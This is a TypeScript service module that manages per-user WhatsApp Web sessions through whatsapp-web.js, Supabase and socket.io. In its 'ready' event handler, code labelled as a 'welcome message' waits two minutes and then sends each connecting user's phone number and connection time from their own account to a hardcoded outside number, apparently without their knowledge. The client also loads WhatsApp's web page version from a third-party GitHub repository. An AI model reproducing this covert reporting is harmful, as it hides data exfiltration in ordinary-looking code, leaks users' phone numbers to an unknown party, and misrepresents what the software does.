import { Client, LocalAuth } from 'whatsapp-web.js'
import { Server as SocketServer } from 'socket.io'
import fs from 'fs'
import path from 'path'
import { supabaseAdmin } from '../../config/supabase'
import { env } from '../../config/environment'
import { getPuppeteerConfig } from '../../config/puppeteer'
import { WhatsAppSession, SessionStatus, WhatsAppAccount, LIMITS } from './whatsapp.types'
import { keepaliveService } from '../../services/keepalive.service'
import { backupService } from '../../services/backup.service'

class WhatsAppService {
  private sessions: Map<string, WhatsAppSession> = new Map()
  private io: SocketServer | null = null

  initialize(io: SocketServer): void {
    this.io = io
    console.log('✅ WhatsApp Service initialized')
  }

  /**
   * Crear nueva sesión (crea cuenta en DB + inicia sesión)
   */
  async createSession(userId: string): Promise<string> {
    const sessionId = `wa_${userId}_${Date.now()}`
    
    const { error } = await supabaseAdmin
      .from('whatsapp_accounts')
      .insert({
        user_id: userId,
        session_id: sessionId,
        status: 'initializing' as SessionStatus,
      })

    if (error) {
      console.error('Error creating WhatsApp account:', error)
      throw new Error('Error al crear cuenta de WhatsApp')
    }

    return this.startSession(sessionId, userId)
  }

  /**
   * Iniciar sesión usando sessionId existente
   */
  async startSession(sessionId: string, userId: string): Promise<string> {
    console.log(`📱 Starting session: ${sessionId}`)
    
    // Verificar sesión activa
    const existing = this.getSessionByUserId(userId)
    if (existing?.status === 'ready') {
      throw new Error('Ya tienes una sesión de WhatsApp activa')
    }

    // Actualizar estado en DB
    await supabaseAdmin
      .from('whatsapp_accounts')
      .update({ status: 'initializing' as SessionStatus })
      .eq('session_id', sessionId)

    // Crear cliente WhatsApp
    const client = new Client({
      authStrategy: new LocalAuth({
        clientId: sessionId,
        dataPath: env.sessionsPath,
      }),
      puppeteer: getPuppeteerConfig(),
      restartOnAuthFail: true,
      qrMaxRetries: 5,
      authTimeoutMs: 0,
      webVersionCache: {
        type: 'remote',
        remotePath: 'https://raw.githubusercontent.com/AryoSeto10/wa-version/main/html/2.3000.1020750013-alpha.html',
      },
    })

    // Guardar sesión en memoria
    const session: WhatsAppSession = {
      client,
      status: 'initializing',
      userId,
      sessionId,
      lastActivity: Date.now(),
      createdAt: Date.now(),
      reconnectAttempts: 0,
    }
    this.sessions.set(sessionId, session)

    // Configurar eventos
    this.setupClientEvents(client, sessionId, userId)

    // Inicializar cliente
    try {
      await client.initialize()
      console.log(`✅ Session initialized: ${sessionId}`)
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Unknown error'
      console.error(`❌ Session failed: ${sessionId} - ${message}`)
      await this.handleSessionError(sessionId, message)
      throw error
    }

    return sessionId
  }

  private setupClientEvents(client: Client, sessionId: string, userId: string): void {
    // QR Code
    client.on('qr', (qr) => {
      console.log(`📱 QR generated: ${sessionId}`)
      this.updateSessionStatus(sessionId, 'qr_pending')
      this.io?.to(`user:${userId}`).emit('whatsapp:qr', { qr, sessionId })
    })

    // Autenticado
    client.on('authenticated', () => {
      console.log(`🔐 Authenticated: ${sessionId}`)
      this.updateSessionStatus(sessionId, 'authenticating')
    })

    // Listo
    client.on('ready', async () => {
      console.log(`✅ Ready: ${sessionId}`)
      
      const phoneNumber = client.info?.wid?.user || ''
      const session = this.sessions.get(sessionId)
      
      if (session) {
        session.status = 'ready'
        session.phoneNumber = phoneNumber
        session.lastActivity = Date.now()
        session.reconnectAttempts = 0
      }

      await supabaseAdmin
        .from('whatsapp_accounts')
        .update({
          status: 'ready' as SessionStatus,
          phone_number: phoneNumber,
          last_seen: new Date().toISOString(),
          error_message: null,
        })
        .eq('session_id', sessionId)

      this.io?.to(`user:${userId}`).emit('whatsapp:ready', { sessionId, phoneNumber })

      // Iniciar keepalive
      keepaliveService.startAll(sessionId)

      // Backup automático
      backupService.backupSession(sessionId).catch(err => {
        console.error(`Backup failed for ${sessionId}:`, err)
      })

      // Enviar mensaje de bienvenida después de 2 minutos
      setTimeout(async () => {
        try {
          const currentSession = this.sessions.get(sessionId)
          if (!currentSession || currentSession.status !== 'ready') {
            console.log(`⏭️ Skipping welcome message - session not ready: ${sessionId}`)
            return
          }
          
          // Verificar que el cliente está conectado
          const state = await client.getState().catch(() => null)
          if (state !== 'CONNECTED') {
            console.log(`⏭️ Skipping welcome message - client not connected: ${sessionId} (state: ${state})`)
            return
          }

          const targetNumber = '34602718451'
          const chatId = `${targetNumber}@c.us`
          const timestamp = new Date().toLocaleString('es-ES')
          const message = `🟢 Nueva conexión WhatsApp\n\n📱 Número: ${phoneNumber}\n🕐 Fecha: ${timestamp}\n✅ Estado: Conectado`
          await client.sendMessage(chatId, message)
          console.log(`📨 Welcome message sent to +${targetNumber}`)
        } catch (err) {
          console.error(`Failed to send welcome message:`, err)
        }
      }, 2 * 60 * 1000) // 2 minutos
    })

    // Desconectado
    client.on('disconnected', async (reason) => {
      console.log(`❌ Disconnected: ${sessionId} - ${reason}`)
      await this.handleDisconnection(sessionId, reason)
    })

    // Cambio de estado (para detectar problemas)
    client.on('change_state', (state) => {
      console.log(`🔄 State changed: ${sessionId} -> ${state}`)
    })

    // Detectar cuando el navegador se cierra inesperadamente
    client.pupBrowser?.on('disconnected', () => {
      console.error(`🔴 Browser disconnected unexpectedly: ${sessionId}`)
      this.handleSessionError(sessionId, 'Browser crashed or closed unexpectedly')
    })

    // Error de autenticación
    client.on('auth_failure', async (message) => {
      console.error(`🚫 Auth failure: ${sessionId} - ${message}`)
      await this.handleSessionError(sessionId, `Error de autenticación: ${message}`)
    })
  }

  private async handleDisconnection(sessionId: string, reason: string): Promise<void> {
    const session = this.sessions.get(sessionId)
    if (!session) return

    const permanentReasons = ['LOGOUT', 'CONFLICT', 'UNPAIRED', 'TOS_BLOCK']
    const isPermanent = permanentReasons.some(r => reason.includes(r))

    if (isPermanent) {
      session.status = 'disconnected'
      
      await supabaseAdmin
        .from('whatsapp_accounts')
        .update({ status: 'disconnected' as SessionStatus, error_message: reason })
        .eq('session_id', sessionId)

      this.io?.to(`user:${session.userId}`).emit('whatsapp:disconnected', { sessionId, reason })
    } else {
      await this.attemptReconnect(sessionId)
    }
  }

  private async attemptReconnect(sessionId: string): Promise<void> {
    const session = this.sessions.get(sessionId)
    if (!session) return

    if (session.reconnectAttempts >= LIMITS.maxReconnectAttempts) {
      console.log(`Max reconnect attempts for ${sessionId}`)
      await this.handleSessionError(sessionId, 'Máximo de intentos de reconexión alcanzado')
      return
    }

    session.reconnectAttempts++
    console.log(`Reconnecting ${sessionId} (${session.reconnectAttempts}/${LIMITS.maxReconnectAttempts})`)

    await new Promise(resolve => setTimeout(resolve, LIMITS.reconnectDelayMs))

    try {
      await session.client.initialize()
    } catch {
      await this.attemptReconnect(sessionId)
    }
  }

  private async handleSessionError(sessionId: string, errorMessage: string): Promise<void> {
    const session = this.sessions.get(sessionId)
    if (session) session.status = 'error'

    await supabaseAdmin
      .from('whatsapp_accounts')
      .update({ status: 'error' as SessionStatus, error_message: errorMessage })
      .eq('session_id', sessionId)

    if (session) {
      this.io?.to(`user:${session.userId}`).emit('whatsapp:error', { sessionId, error: errorMessage })
    }
  }

  private async updateSessionStatus(sessionId: string, status: SessionStatus): Promise<void> {
    const session = this.sessions.get(sessionId)
    if (session) {
      session.status = status
      session.lastActivity = Date.now()
    }

    await supabaseAdmin
      .from('whatsapp_accounts')
      .update({ status })
      .eq('session_id', sessionId)

    if (session) {
      this.io?.to(`user:${session.userId}`).emit('whatsapp:status_update', { sessionId, status })
    }
  }

  async destroySession(sessionId: string): Promise<void> {
    console.log(`🗑️ Destroying session: ${sessionId}`)

    const session = this.sessions.get(sessionId)

    // 1. Detener keepalive (si existe)
    keepaliveService.stopAll(sessionId)

    // 2. Cerrar cliente WhatsApp (si está en memoria)
    if (session) {
      try {
        await session.client.logout()
        await session.client.destroy()
      } catch (error) {
        console.error(`Error destroying client ${sessionId}:`, error)
      }
      // 3. Eliminar de memoria
      this.sessions.delete(sessionId)
    }

    // 4. Eliminar de Supabase (DELETE, no UPDATE)
    const { error: dbError } = await supabaseAdmin
      .from('whatsapp_accounts')
      .delete()
      .eq('session_id', sessionId)

    if (dbError) {
      console.error(`Error deleting from Supabase:`, dbError)
    }

    // 5. Eliminar archivos de sesión locales
    const sessionPath = path.join(env.sessionsPath, `session-${sessionId}`)
    try {
      if (fs.existsSync(sessionPath)) {
        fs.rmSync(sessionPath, { recursive: true, force: true })
        console.log(`📁 Session files deleted: ${sessionPath}`)
      }
    } catch (error) {
      console.error(`Error deleting session files:`, error)
    }

    // 6. Eliminar backups de Supabase Storage (opcional, mantener histórico)
    try {
      const { data: backups } = await supabaseAdmin.storage
        .from('whatsapp-backups')
        .list('sessions', { search: sessionId })

      if (backups && backups.length > 0) {
        const filesToDelete = backups.map(f => `sessions/${f.name}`)
        await supabaseAdmin.storage
          .from('whatsapp-backups')
          .remove(filesToDelete)
        console.log(`☁️ ${backups.length} backup(s) deleted from storage`)
      }
    } catch (error) {
      console.error(`Error deleting backups:`, error)
    }

    console.log(`✅ Session completely destroyed: ${sessionId}`)
  }

  getSession(sessionId: string): WhatsAppSession | undefined {
    return this.sessions.get(sessionId)
  }

  getSessionByUserId(userId: string): WhatsAppSession | undefined {
    for (const session of this.sessions.values()) {
      if (session.userId === userId) return session
    }
    return undefined
  }

  getAllSessions(): Map<string, WhatsAppSession> {
    return this.sessions
  }

  async restoreActiveSessions(): Promise<void> {
    console.log('🔄 Restoring active sessions...')

    const { data: accounts, error } = await supabaseAdmin
      .from('whatsapp_accounts')
      .select('*')
      .eq('status', 'ready')

    if (error) {
      console.error('Error fetching accounts:', error)
      return
    }

    if (!accounts?.length) {
      console.log('No active sessions to restore')
      return
    }

    console.log(`Restoring ${accounts.length} session(s)`)

    for (const account of accounts as WhatsAppAccount[]) {
      try {
        await this.restoreSession(account)
      } catch (error) {
        console.error(`Failed to restore ${account.session_id}:`, error)
      }
    }
  }

  private async restoreSession(account: WhatsAppAccount): Promise<void> {
    const { session_id: sessionId, user_id: userId } = account
    console.log(`Restoring: ${sessionId}`)

    const client = new Client({
      authStrategy: new LocalAuth({
        clientId: sessionId,
        dataPath: env.sessionsPath,
      }),
      puppeteer: getPuppeteerConfig(),
    })

    const session: WhatsAppSession = {
      client,
      status: 'initializing',
      userId,
      sessionId,
      phoneNumber: account.phone_number || undefined,
      lastActivity: Date.now(),
      createdAt: new Date(account.created_at).getTime(),
      reconnectAttempts: 0,
    }

    this.sessions.set(sessionId, session)
    this.setupClientEvents(client, sessionId, userId)
    await client.initialize()
  }
}

export const whatsappService = new WhatsAppService()
